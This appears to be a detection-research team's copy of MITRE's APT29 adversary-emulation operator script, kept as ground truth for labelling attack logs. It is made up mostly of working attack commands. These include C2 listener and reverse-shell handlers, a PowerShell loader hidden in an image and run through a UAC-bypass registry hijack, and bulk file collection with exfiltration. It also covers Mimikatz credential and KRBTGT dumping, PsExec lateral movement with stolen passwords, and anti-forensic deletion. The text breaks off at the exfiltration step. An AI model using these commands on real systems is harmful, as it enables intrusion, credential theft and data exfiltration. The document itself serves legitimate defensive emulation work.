# APT29 emulation plan — what the attackers actually did

MITRE's own operator script for ATT&CK Evals Round 2, the attack our logs captured.
Fetched from OTRF at pinned commit `d9d40ef1`, digest in `datasets.lock`.

This is the scaffold for the Phase 1a causal key: it tells us *what happened*,
so authoring the key becomes 'find these events in the log' rather than
'infer the story from 196,081 lines'.

## day1

### PUPY SETUP
**Who/where:** admin · PUPY  

Connect to Pupy
user account: <adminusername>
password: <useradminpassword>
IP Address: 192.168.0.4

Using a dockerized version of Pupy (https://github.com/alxchk/pupy) at commit f8c829dd66449888ec3f4c7d086e607060bca892 from https://github.com/Cyb3rWard0g/docker-pupy

```
sudo docker run --rm -it -p 1234:1234 -v "/opt/attack-platform:/tmp/attack-platform" docker-pupy python pupysh.py

Start Listener:
[pupy] listen -a ec4
```

### WINDOWS CONNECTION SETUP
**Who/where:** pbeesly · SCRANTON  

RDP to SCRANTON

```
user account: dmevals\pbeesly
IP Address: 10.0.1.4
pwd: Fl0nk3rt0n!T0by
```

### WINDOWS CONNECTION SETUP
**Who/where:** pbeesly · NASHUA  

RDP to NASHUA

This is because we need a non zero value (for a user session) for a lateral movement action later.

```
user account: dmevals\pbeesly
IP Address: 10.0.1.6
pwd: Fl0nk3rt0n!T0by
```

### 1.A — Initial Breach
**Technique:** User Execution, Masquerading, Uncommonly Used Port   
**Who/where:** pbeesly · SCRANTON → PUPY  

The scenario begins with an initial breach, where a legitimate user clicks (T1204) an executable payload (screensaver executable) masquerading as a benign word document (T1036). Once executed, the payload creates a C2 connection over port 1234 (T1065) using the RC4 cryptographic cipher .

```
Double click `3aka3.doc` on C:\programdata\victim\
```

### 1.B — Initial Breach
**Technique:** Command-Line Interface, / PowerShell  
**Who/where:** admin · TEAM SERVER → SCRANTON  

pupy terminal -> CMD -> PowerShell

The attacker then uses the active C2 connection to spawn interactive cmd.exe (T1059) and powershell.exe (T1086) shells.

```
[pupy] > shell  

[pupy (CMD)] > powershell
```

### 2.A — Rapid Collection and Exfiltration
**Technique:** File and Directory Discovery, / Automated Collection, Data from Local System, / Data Compressed, / Data Staged  
**Who/where:** admin · TEAM SERVER → SCRANTON  

The attacker runs a one-liner command to search for filesystem for document and media files (T1083, T1119), collecting (T1005) and compressing (T1002) content into a single file (T1074).

```
Paste the following PowerShell 1-liner into the Pupy terminal:

[pupy (PowerShell)] > 

$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force
```

### 2.A — Rapid Collection and Exfiltration
**Who/where:** admin · TEAM SERVER → SCRANTON  

pupy terminal <- CMD <- PowerShell

```
[pupy (PowerShell)] > exit 

[pupy (CMD)] > exit
```

### 2.B — Rapid Collection and Exfiltration
**Technique:** Exfiltration Over Command and Control Channel  
**Who/where:** admin · TEAM SERVER → SCRANTON  

The file is then exfiltrated over the existing C2 connection (T1041).

```
[pupy] > download "C:\Users\pbeesly\AppData\Roaming\Draft.Zip" .
```

### MSF SETUP
**Who/where:** admin · TEAM SERVER  

Connect to a new Metasploit container (Port 443)
Using an official dockerized version of Metasploit (https://github.com/rapid7/metasploit-framework)

```
sudo docker run --rm -it -p 443:443 -v "/opt/attack-platform:/tmp/attack-platform" metasploitframework/metasploit-framework ./msfconsole
```

### 3.A — Deploy Stealth Toolkit
**Technique:** Remote File Copy, / Obfuscated Files or Information  
**Who/where:** admin · TEAM SERVER → SCRANTON  

The attacker now uploads a new payload (T1105) to the victim. The payload is a legitimately formed image file with a concealed PowerShell script (T1027).

```
Start Metasploit handler:

[msf] > handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https   

From Pupy, upload monkey.png to target:

[pupy] > upload "/tmp/attack-platform/monkey.png" "C:\Users\pbeesly\Downloads\monkey.png"      
[pupy] > shell      
[pupy CMD] > powershell
```

### 3.B — Deploy Stealth Toolkit
**Technique:** Component Object Model Hijacking, / Bypass User Account Control, / Commonly Used Port, / Standard Application Layer Protocol, / Standard Cryptographic Protocol  
**Who/where:** admin · TEAM SERVER → SCRANTON  

The attacker then elevates privileges via a user account control (UAC) bypass (T1122, T1088), which executes the newly added payload. A new C2 connection is established over port 443 (T1043) using the HTTPS protocol (T1071, T1032).

```
[pupy (PowerShell)] > 
New-Item -Path HKCU:\Software\Classes -Name Folder -Force;
New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;
New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;
New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;
Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)"

Paste the following 1-liner when prompted for value:
powershell.exe -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbeesly\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"

[pupy (PowerShell)] > 

Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Force
      
When prompted for value, press: [Enter]   

[pupy (PowerShell)] > exit
[pupy (CMD)] > %windir%\system32\sdclt.exe 
[pupy CMD] > powershell

You should receive a high integrity Meterpreter callback.
```

### 3.C — Deploy Stealth Toolkit
**Technique:** Modify Registry  
**Who/where:** admin · TEAM SERVER  

Finally, the attacker removes artifacts of the privilege escalation from the Registry (T1112).

```
[pupy (PowerShell)] > Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force
[pupy (PowerShell)] > exit         
[pupy (CMD)] > exit
```

### 4.A — Defense Evasion and Discovery
**Technique:** PowerShell, / Deobfuscate/Decode Files or Information  
**Who/where:** admin · TEAM SERVER → SCRANTON  

The attacker uploads additional tools (T1086) through the new, elevated access before spawning an interactive powershell.exe shell (T1086). The additional tools are decompressed (T1140) and positioned on the target for usage.

```
From Metasploit:
-----------------------

[msf] > sessions       
[msf] > sessions -i 1        

[meterpreter\*] > upload /tmp/attack-platform/SysinternalsSuite.zip "C:\\Users\\pbeesly\\Downloads\\SysinternalsSuite.zip"

[meterpreter\*] > execute -f powershell.exe -i -H

[meterpreter (PowerShell)\*] >  Expand-Archive -LiteralPath "$env:USERPROFILE\Downloads\SysinternalsSuite.zip" -DestinationPath "$env:USERPROFILE\Downloads\"

[meterpreter (PowerShell)\*] >  if (-Not (Test-Path -Path "C:\Program Files\SysinternalsSuite")) { Move-Item -Path $env:USERPROFILE\Downloads\SysinternalsSuite -Destination "C:\Program Files\SysinternalsSuite" }

[meterpreter (PowerShell)\*] > cd "C:\Program Files\SysinternalsSuite\"
```

### 4.B — Defense Evasion and Discovery
**Technique:** Process Discovery, / File Deletion  
**Who/where:** admin · TEAM SERVER → SCRANTON  

The attacker then enumerates running processes (T1057) to discover/terminate the initial access from Step 1 (Pupy Agent) before deleting various files (T1107) associated with that access.

```
Terminate Pupy RAT process:

[meterpreter (PowerShell)\*] > Get-Process

[meterpreter (PowerShell)\*] > Stop-Process -Id <rcs.3aka3.doc PID> -Force

You may now close Pupy.

From Metasploit:

[meterpreter (PowerShell)\*] > gci C:\programdata\victim\        

[meterpreter (PowerShell)\*] > .\sdelete64.exe /accepteula "C:\programdata\victim\???cod.3aka3.scr"

[meterpreter (PowerShell)\*] > .\sdelete64.exe /accepteula "$env:APPDATA\Draft.Zip"

[meterpreter (PowerShell)\*] > .\sdelete64.exe /accepteula "$env:USERPROFILE\Downloads\SysinternalsSuite.zip"

Import custom script, readme.ps1:

[meterpreter (PowerShell)\*] > Move-Item .\readme.txt readme.ps1

[meterpreter (PowerShell)\*] > . .\readme.ps1
```

### 4.C — Defense Evasion and Discovery
**Technique:** File and Directory Discovery, / System Owner/User Discovery, / System Information Discovery, / System Network Configuration Discovery, / Process Discovery, / Security Software Discovery, / Permission Groups Discovery, / Execution through API  
**Who/where:** admin · TEAM SERVER → SCRANTON  

Finally, the attacker launches a PowerShell script that performs a wide variety of reconnaissance commands (T1083, T1033, T1082, T1016, T1057, T1063, T1069), some of which are done by accessing the Windows API (T1106).

```
[meterpreter (PowerShell)\*] > Invoke-Discovery
```

### 5.A — Persistence
**Technique:** New Service   
**Who/where:** admin · TEAM SERVER → SCRANTON  

The attacker establishes two distinct means of persistent access to the victim by creating a new service (T1050) and creating a malicious payload in the Windows Startup folder (T1060)

```
[meterpreter (PowerShell)\*] > Invoke-Persistence -PersistStep 1
```

### 5.B — Persistence
**Technique:** Registry Run Keys / Startup Folder   
**Who/where:** admin · TEAM SERVER → SCRANTON  

The attacker establishes two distinct means of persistent access to the victim by creating a new service (T1050) and creating a malicious payload in the Windows Startup folder (T1060)

```
[meterpreter (PowerShell)\*] > Invoke-Persistence -PersistStep 2
```

### 6.A — Credentials Access
**Technique:** Credentials in Files, / Credential Dumping, / Masquerading  
**Who/where:** admin · TEAM SERVER → SCRANTON  

The attacker accesses credentials stored in a local web browser (T1081, T1003) using a tool renamed to masquerade as a legitimate utility (T1036).

```
Execute chrome-password collector:

[meterpreter (PowerShell)\*] > & "C:\Program Files\SysinternalsSuite\accesschk.exe"
```

### 6.B — Credentials Access
**Technique:** Private Keys  
**Who/where:** admin · TEAM SERVER → SCRANTON  

The attacker then harvests private keys (T1145)

```
Steal PFX certificate:      
  
[meterpreter (PowerShell)\*] > Get-PrivateKeys     

[meterpreter (PowerShell)\*] > exit
```

### 6.C — Credentials Access
**Technique:** Credential Dumping  
**Who/where:** admin · TEAM SERVER → SCRANTON  

The attacker then harvests password hashes (T1003).

```
Dump password hashes:

[meterpreter\*] > run post/windows/gather/credentials/credential_collector
```

### 7.A — Collection and Exfiltration
**Technique:** Screen Capture, / Clipboard Data, / Input Capture  
**Who/where:** admin · TEAM SERVER → SCRANTON  

The attacker collects screenshots (T1113), data from the user’s clipboard (T1115), and keystrokes (T1056).

```
[meterpreter\*] > execute -f powershell.exe -i -H

[meterpreter (PowerShell)\*] > cd "C:\Program Files\SysinternalsSuite"

[meterpreter (PowerShell)\*] > Move-Item .\psversion.txt psversion.ps1

[meterpreter (PowerShell)\*] > . .\psversion.ps1

[meterpreter (PowerShell)\*] > Invoke-ScreenCapture;Start-Sleep -Seconds 3;View-Job -JobName "Screenshot"   

From the Windows victim, type text and copy to the clipboard.

[meterpreter (PowerShell)\*] > Get-Clipboard

[meterpreter (PowerShell)\*] > Keystroke-Check    

[meterpreter (PowerShell)\*] > Get-Keystrokes;Start-Sleep -Seconds 15;View-Job -JobName "Keystrokes"

From SCRANTON, enter keystrokes.

View keylog output from Metasploit:

[meterpreter (PowerShell)\*] > View-Job -JobName "Keystrokes"
[meterpreter (PowerShell)\*] > Remove-Job -Name "Keystrokes" -Force   
[meterpreter (PowerShell)\*] > Remove-Job -Name "Screenshot" -Force
```

### 7.B — Collection and Exfiltration
**Technique:** Data from Local System, / Data Compressed, / Data Encrypted, / Exfiltration Over Alternative Protocol  
**Who/where:** admin · SCRANTON → TEAM SERVER  

The attacker then collects files (T1005), which are compressed (T1002) and encrypted (T1022), before being exfiltrated to an attacker-controlled WebDAV share (T1048).

```
[meterpreter (PowerShell)\*] > Invoke-Exfil
press: [Enter]  in 1-2 mins to get updates and terminal control back
```

### 8.A — Lateral Movement
**Technique:** Remote System Discovery, / Windows Remote Management, / Process Discovery  
**Who/where:** admin · SCRANTON → NASHUA  

The attacker uses Lightweight Directory Access Protocol (LDAP) queries to enumerate other hosts in the domain (T1018) before creating a remote PowerShell session to a secondary victim (T1028). Through this connection, the attacker enumerates running processes (T1057).

```
[meterpreter (PowerShell)\*] > Ad-Search Computer Name *

[meterpreter (PowerShell)\*] >  

Invoke-Command -ComputerName NASHUA -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like "*\$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId

Note the session ID for step 8C.
```

### MSF NEW SESSION
**Who/where:** admin · TEAM SERVER  

Connect to a new Metasploit container (port 8443)
Using an official dockerized version of Metasploit (https://github.com/rapid7/metasploit-framework)

```
sudo docker run --rm -it -p 8443:8443 -v "/opt/attack-platform:/tmp/attack-platform" metasploitframework/metasploit-framework ./msfconsole
```

### 8.B — Lateral Movement
**Technique:** Software Packing  
**Who/where:** admin · SCRANTON → NASHUA  

Next, the attacker uploads a new UPX-packed payload (T1045) to the secondary victim.

```
Start a new instance of Metasploit, and spawn a Metasploit handler:

[msf] > handler -H 0.0.0.0 -P 8443 -p python/meterpreter/reverse_https

Return to current Meterpreter session:

[meterpreter (PowerShell)\*] > Invoke-SeaDukeStage -ComputerName NASHUA
```

### 8.C — Lateral Movement
**Technique:** Windows Admin Shares, / Service Execution, / Valid Accounts  
**Who/where:** admin · SCRANTON → NASHUA  

This new payload is executed on the secondary victim via the PSExec utility (T1077, T1035) using the previously stolen credentials (T1078).

```
Execute SEADUKE Remotely via PSEXEC

[meterpreter (PowerShell)\*] >

.\PsExec64.exe -accepteula \\NASHUA -u "dmevals\pbeesly" -p "Fl0nk3rt0n!T0by" -i <Session Number from step 8.A. e.g. 4> "C:\Windows\Temp\python.exe"
```

### 9.A — Collection
**Technique:** Remote File Copy  
**Who/where:** admin · TEAM SERVER → NASHUA  

The attacker uploads additional utilities to the secondary victim (T1105)

```
From the second Metasploit terminal:

[msf] > sessions   
[msf] > sessions -i 1   

[meterpreter\*] > 
upload "/tmp/attack-platform/Seaduke/rar.exe" "C:\\Windows\\Temp\\Rar.exe"

[meterpreter\*] > 
upload "/tmp/attack-platform/Seaduke/sdelete64.exe" "C:\\Windows\\Temp\\sdelete64.exe"
```

### 9.B — Collection
**Technique:** PowerShell, / File and Directory Discovery, / Automated Collection, / Data from Local System, / Data Encrypted, / Data Compressed, / Data Staged, / Exfiltration Over Command and Control Channel  
**Who/where:** admin · TEAM SERVER → NASHUA  

The attacker runs a PowerShell one-liner command (T1086) to search for filesystem for document and media files (T1083, T1119). Files of interested are collected (T1005) then encrypted (T1022) and compressed (T1002) into a single file (T1074). The file this then exfiltrated over the existing C2 connection (T1041).

```
[meterpreter\*] > execute -f powershell.exe -i -H
    
[meterpreter (PowerShell)\*] >    

$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force

[meterpreter (PowerShell)\*] > cd C:\Windows\Temp       

[meterpreter (PowerShell)\*] > .\Rar.exe a -hpfGzq5yKw "$env:USERPROFILE\Desktop\working.zip" "$env:APPDATA\working.zip"

[meterpreter (PowerShell)\*] > exit

[meterpreter\*] > download "C:\\Users\\pbeesly\\Desktop\\working.zip" /tmp/
```

### 9.C — Collection
**Technique:** File Deletion  
**Who/where:** admin · TEAM SERVER → NASHUA  

Finally, the attacker deletes various files (T1107) associated with that access

```
[meterpreter\*] > shell

[meterpreter (Shell)\*] > cd "C:\Windows\Temp"

[meterpreter (Shell)\*] > .\sdelete64.exe /accepteula "C:\Windows\Temp\Rar.exe"  

[meterpreter (Shell)\*] > .\sdelete64.exe /accepteula "C:\Users\pbeesly\AppData\Roaming\working.zip"    

[meterpreter (Shell)\*] > .\sdelete64.exe /accepteula "C:\Users\pbeesly\Desktop\working.zip"  

[meterpreter (Shell)\*] > del "C:\Windows\Temp\sdelete64.exe"
 
Terminate Session   
[meterpreter (Shell)\*] > exit         
[meterpreter\*] > exit
msf> exit
```

### 10.A — Persistence & Execution
**Technique:** Service Execution, / Registry Run Keys / Startup Folder   
**Who/where:** pbeesly · SCRANTON  

The original victim is rebooted and the legitimate user logs in, emulating ordinary usage and a passage of time. This activity triggers the previously established persistence mechanisms, namely the execution of the new service (T1035) and payload in the Windows Startup folder (T1060).

```
Reboot Windows SCRANTON; wait for system to boot up

You should receive a callback with SYSTEM permissions from the javamtsup service
```

### 10.B — Persistence & Execution
**Technique:** Registry Run Keys / Startup Folder   
**Who/where:** pbeesly · SCRANTON  

The payload in the Startup folder executes a follow-on payload using a stolen token (T1106, T1134).

```
Trigger the Startup Folder persistence by logging in to Windows SCRANTON
```

## day2

### WINDOWS CONNECTION SETUP
**Who/where:** mscott · UTICA SCRANTON NEWYORK  

Based on the instructions from ATT&CK Evals repo, we need to RDP to three victims as domain admin user.

```
Username: dmevals\mscott
PWD: abc123!D@t3M1k3

a) UTICA (Patient Zero) : 10.0.1.5
B) SCRANTON: 10.0.1.4
C) NEWYORK: 10.0.0.4
```

### POSHC2 SETUP
**Who/where:** admin · TEAMSERVER  

Log on to TEAMSERVER and run PoshC2 server to generate a few One-Liners. We will use those to update a few files before executing this emulation plan.

```
sudo docker run -ti --rm -p 443:443 -v /opt/PoshC2_Project:/opt/PoshC2_Project -v /opt/PoshC2:/opt/PoshC2 -e PAYLOAD_COMMS_HOST=https://192.168.0.4 --name poshc2 poshc2 /usr/bin/posh-server
```

### POSHC2 SETUP
**Who/where:** admin · TEAMSERVER  

Copy the PowerShell command one-liner created under the "Execution via Command Prompt" section. From "powershell" to the last character of the encoded commands.

```
In a separate terminal, access the PoshC2 server docker container. We do this because the PoshC2 Server is not running detached.

sudo nano /opt/PoshC2/resources/modules/stepFifteen_wmi.ps1

CTRL+V one-liner between the " " in the CommandLineTemplate="" line.

Example: 
CommandLineTemplate="powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH........"
```

### POSHC2 SETUP
**Who/where:** admin · TEAMSERVER  

Copy and the PowerShell command one-liner created under the "Execution via Command Prompt" section. From "powershell" to the last character of the encoded commands.

```
Use the same separate terminal to run the following commands:

sudo nano /opt/PoshC2/resources/modules/stepFourteen_bypassUAC.ps1

CTRL+V one-liner between the " " for the 'Value' variable.

Example: 
New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value "powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTA......"
```

### POSHC2 SETUP
**Who/where:** admin · TEAMSERVER  

Update stepFourteen_credDump.ps1

```
This is already done for your ;) . Nothing to do here. Just  make sure to host the file on port 8080 with Python HTTP Server library when the time comes.
```

### POSHC2 SETUP
**Who/where:** admin · TEAMSERVER → LOCAL PC (HOME)  

Download compiled DLL from PoshC2 server to be used in your Patient Zero computer to set up the scripts needed for the Initial Breach phase.

```
In the same terminal copy a /opt/PoshC2_Project/payloads/Posh_v4_x64.dll from the Docker container to your local host. We need to copy it over to UTICA Windows VM. In order to do that, first you need run the following command outside of the docker container.

sudo docker cp poshc2:/opt/PoshC2_Project/payloads/Posh_v4_x64.dll .

On your local computer you can run the following command to copy the file from your Azure VM to your Local computer (home):

scp <adminusername>@192.168.0.4:/home/<adminusername/Posh_v4_x64.dll .

Copy that DLL to your patient zero box (UTICA - 10.0.1.5) Desktop (Make sure Windows Defender is TURNED OFF/ DISABLED)
```

### WINDOWS BLOB & SCHEMA SETUP
**Who/where:** mscott · UTICA  

We are now going to use the DLL we just copied over and run a few commands to update the Schema.ps1 script located in C:\programdata\victim. Every script in there can be modified with a privilege PowerShell_ISE

```
[CMD] > cd Desktop
[CMD] > certutil -encode Posh_v4_x64.dll blob
[CMD] > powershell
[PS] > $blob = (Get-Content .\blob) -join ""; $blob > .\blob

Open blob file in text editor
Delete new line at end of file and copy all (CTRL-A, CTRL-C)

Paste value (ex: -----BEGIN CERTIFICATE-----...-----END CERTIFICATE-----) into $bin variable (6th line) in C:\programdata\victim\schemas.ps1

Save this update and do not close the file yet.
```

### WINDOWS SCHEMA 
**Who/where:** mscott · UTICA  

Copy the encoded part of the PowerShell command one-liner created under the "Execution via Command Prompt" section that we used earlier.

```
Just the encoded portion (ex: WwBTAH...=) into $enc_ps variable (4th line from bottom) in schemas.ps1

    ex: $enc_ps = "WwBTAH...=="

Save and close the schema file.
```

### Windows Initial Access Payload
**Who/where:** dschrute · UTICA  

Prepare Initial Access Payload

```
Lock Computer
Log in as dmevals\dschrute, PWD: Schrut3F@rms!B33ts

Copy over the following files from C:\programdata\victim onto the Desktop of the intial victim:

1) 2016_United_States_presidential_election_-_Wikipedia.html
2) make_lnk.ps1
3)schemas.ps1

Make sure Windows Defender is disabled.

Copy over MITRE-ATTACK-EVALS.HTML into the the Documents folder of the intial victim (C:\Users\dschrute\Documents)

Execute make_lnk.ps1 (Right click > Run with PowerShell), this will generate 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk (ACCEPT PROMPT)

drag make_lnk.ps1 and schemas.ps1 to Recycle Bin and empty the Recycle Bin (Right click > Empty Recycle Bin)
```

### 11.A — Initial Breach
**Technique:** User Execution, / NTFS File Attributes, / Virtualization/Sandbox Evasion, / System Information Discovery, / Peripheral Device Discovery, / System Owner/User Discovery, / System Network Configuration Discovery, / Process Discovery, / File and Directory Discovery, / Registry Run Keys / Startup Folder, / Deobfuscate/Decode Files or Information, / PowerShell, / Commonly Used Port, / Standard Application Layer Protocol, / Standard Cryptographic Protocol  
**Who/where:** dschrute · UTICA  

The scenario begins with initial breach, where a legitimate user clicks (T1204) a link file payload, which executes an alternate data stream (ADS) hidden on another dummy file (T1096) delivered as part of the spearphishing campaign. The ADS performs a series of enumeration commands to ensure it is not executing in a virtualized analysis environment (T1497, T1082, T1120, T1033, T1016, T1057, T1083) before establishing persistence via a Windows Registry Run key entry (T1060) pointing to an embedded DLL payload that was decoded and dropped to disk (T1140). The ADS then executes a PowerShell stager (T1086) which creates a C2 connection over port 443 (T1043) using the HTTPS protocol (T1071, T1032).

```
If you are still in UTICA (10.0.1.5), you already logged on as dmevals\dschrute. Make sure that Windows Defender is disabled on UTICA, SCRANTON and NEWYORK. Also, if you are collecting data with Logstash -> Azure Event Hubs -> kafkacat -> JSON File, make sure you start collection now.

Execute 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk (double click), output will display in termina

You will now recieve a new, low integrity callback in your PoshC2 Server.
```

### POSHC2
**Who/where:** admin · TEAMSERVER  

In your PoshC2 Server you should see a new connection. Now we are going to connect to the PoshC2 server with the PoshC2 client using the same docker image in the same box (192.168.0.4)

```
sudo docker run -ti --rm -v /opt/PoshC2_Project:/opt/PoshC2_Project -v /opt/PoshC2:/opt/PoshC2 --name poshc2-client poshc2 /usr/bin/posh

Provide a username (anything)

Enter 1 to access the only session available
```

### 12.A — Fortify Access
**Technique:** Timestomp, / File and Directory Discovery  
**Who/where:** dschrute · UTICA  

The attacker modifies the time attributes of the DLL payload (T1099) used in the previously established persistence mechanism to match that of a random file found in the victim’s System32 directory (T1083).

```
1. loadmodule timestomp.ps1
2. timestomp C:\Users\dschrute\AppData\Roaming\Microsoft\kxwn.lock
```

### 12.B — Fortify Access
**Technique:** Security Software Discovery  
**Who/where:** dschrute · UTICA  

The attacker then enumerates registered AV products (T1063)

```
1.  loadmodule stepTwelve.ps1
2.  detectav
```

### 12.C — Fortify Access
**Technique:** Query Registry  
**Who/where:** dschrute · UTICA  

The attacker then enumerates software installed by the user documented in the Windows Registry (T1012)

```
1.  software
```

### 13.A — Local Enumeration
**Technique:** System Information Discovery   
**Who/where:** dschrute · UTICA  

The attacker performs local enumeration using various Windows API calls, specifically gathering the local computer name (T1082).

```
1. loadmodule stepThirteen.ps1
2.  comp
```

### 13.B — Local Enumeration
**Technique:** Security Software Discovery  
**Who/where:** dschrute · UTICA  

The attacker performs local enumeration using various Windows API calls, specifically gathering domain name (T1063)

```
1.  domain
```

### 13.C — Local Enumeration
**Technique:** System Owner/User Discovery  
**Who/where:** dschrute · UTICA  

The attacker performs local enumeration using various Windows API calls, specifically gathering current user context (T1033)

```
1.  user
```

### 13.D — Local Enumeration
**Technique:** Process Discovery  
**Who/where:** dschrute · UTICA  

The attacker performs local enumeration using various Windows API calls, specifically gathering running processes (T1057).

```
1.  pslist
```

### 14.A — Elevation
**Technique:** Component Object Model Hijacking, / Bypass User Account Control   
**Who/where:** dschrute · UTICA  

The attacker elevates privileges via a user account control (UAC) bypass (T1122, T1088).

```
1.  loadmodule stepFourteen_bypassUAC.ps1
2.  bypass
3.  You will now recieve a new, high integrity callback
```

### 14.B — Elevation
**Technique:** Windows Management Instrumentation, / Remote File Copy, / Credential Dumping, / Obfuscated Files or Information, / Process Discovery, / Deobfuscate/Decode Files or Information  
**Who/where:** dschrute · UTICA  

The attacker then uses the new elevated access to create and execute code within a custom WMI class (T1047) that downloads (T1105) and executes Mimikatz to dump plain-text credentials (T1003), which are parsed, encoded, and stored in the WMI class (T1027). After tracking that the WMI execution has completed (T1057), the attacker reads the plaintext credentials stored within the WMI class (T1140)

```
1.  in a separate terminal copy m.exe from /opt/Poshc2/resources/modules/ to /tmp/ if it does not exist yet.
2.  Confirm m.exe is there and is a Windows PE ($ file /tmp/m)
    *  m.exe is a copy of the Mimikatz executable (available at https://github.com/gentilkiwi/mimikatz)
3.  in your separate terminal, change directory to /tmp and host file on port 8080 (sudo python -m SimpleHTTPServer 8080 .)
4.  Interact with new callback (enter 'back' to go back to the sessions list)
5.  loadmodule stepFourteen_credDump.ps1
6.  wmidump
7.  Kill the python server (CTRL-C) once you see a GET request on the python server (VM terminal)
```

### 15.A — Establish Persistence
**Technique:** Windows Management Instrumentation Event Subscription, / System Owner/User Discovery  
**Who/where:** dschrute · UTICA  

The attacker establishes a secondary means of persistent access to the victim by creating a WMI event subscription (T1084) to execute a PowerShell payload whenever the current user (T1033) logs in.

```
1.  loadmodule stepFifteen_wmi.ps1
2.  wmi
    
**Note:** Do not RDP into the initial access from this point forward, you will trigger callbacks intended for step 20
```

### 16.A — Lateral Movement
**Technique:** Remote System Discovery  
**Who/where:** dschrute · UTICA → NEWYORK  

The attacker enumerates the environment’s domain controller (T1018)

```
1.  Interact with low integrity callback
2.  loadmodule powerView.ps1 (available at https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
3.  get-netdomaincontroller
```

### 16.B — Lateral Movement
**Technique:** System Owner/User Discovery, / Execution through API  
**Who/where:** dschrute · UTICA  

The attacker enumerates the domain’s security identifier (SID) (T1033) via the Windows API (T1106).

```
1. loadmodule stepSixteen_SID.ps1
2. siduser
3. Save the value for the domain SID (ex: `S-1-5-21-2219224806-3979921203-557828661-1110`) and delete the RID (ex: `-1110`) of the end (ex: `S-1-5-21-2219224806-3979921203-557828661`)
```

### 16.C — Lateral Movement
**Technique:** Valid Accounts, / Windows Remote Management  
**Who/where:** dschrute · UTICA → NEWYORK  

Next, the attacker uses the previously dumped credentials (T1078) to create a remote PowerShell session to the domain controller (T1028).

```
1. Interact with high integrity callback
2. loadmodule Invoke-WinRMSession.ps1 (available at https://github.com/nettitude/PoshC2/blob/master/resources/modules/Invoke-WinRMSession.ps1)
3. invoke-winrmsession -Username "dmevals\mscott" -Password "abc123!D@t3M1k3" -IPAddress NEWYORK
4. Output will tell you a session opened and give you the format for using it, ex:
    `Session opened, to run a command do the following:`
    `Invoke-Command -Session $[session_id] -scriptblock {Get-Process} | out-string`
5. Save the value for the session_id (ex: `$hzaqx`)

**Note:** If you get an error here, reboot domain controller, then re-run the 2 winrm setup commands before re-executing 16.C
```

### 16.D — Lateral Movement
**Technique:** Remote File Copy, / Credential Dumping  
**Who/where:** dschrute · UTICA → NEWYORK  

Through this connection, the attacker copies the Mimikatz binary used in Step 14 to the domain controller (T1105) then dumps the hash of the KRBTGT account (T1103).

```
1.  Copy-Item m.exe -Destination "C:\Windows\System32\" -ToSession $[session id]
    *  `m.exe` is a copy of the Mimikatz executable (available at https://github.com/gentilkiwi/mimikatz)
2.  Invoke-Command -Session $[session id] -scriptblock {C:\Windows\System32\m.exe privilege::debug "lsadump::lsa /inject /name:krbtgt" exit} | out-string
3.  Take note of value for the NTLM hash (ex: `NTLM : f4a688010d80770a55a22893dc6ac510`) near the top (Under RID and User after `* Primary`)
4.  Get-PSSession | Remove-PSSession
```

### 17.A — Collection
**Technique:** Email Collection /   
**Who/where:** dschrute · UTICA  

The attacker harvests emails stored in the local email client (T1114)

```
1.  Interact with low integrity callback
2.  loadmodule stepSeventeen_email.ps1
3.  psemail
```

### 17.B — Collection
**Technique:** Data from Local System, / Data Staged  
**Who/where:** dschrute · UTICA  

The attacker collects (T1005) and stages (T1074) a file of interest.

```
1.  New-Item -Path "C:\Windows\Temp\" -Name "WindowsParentalControlMigration" -ItemType "directory"
2.  Copy-Item "C:\Users\dschrute\Documents\MITRE-ATTACK-EVALS.HTML" -Destination "C:\Windows\Temp\WindowsParentalControlMigration"
```

### 17.C — Collection
**Technique:** Data Compressed, / Obfuscated Files or Information  
**Who/where:** dschrute · UTICA  

The staged file is compressed (T1002) as well as prepended with the magic bytes of the GIF file type (T1027).

```
1. Interact with high integrity callback 
2. loadmodule stepSeventeen_zip.ps1
3.  zip C:\Windows\Temp\WindowsParentalControlMigration.tmp C:\Windows\Temp\WindowsParentalControlMigration
```

### 18.A — Exfiltration
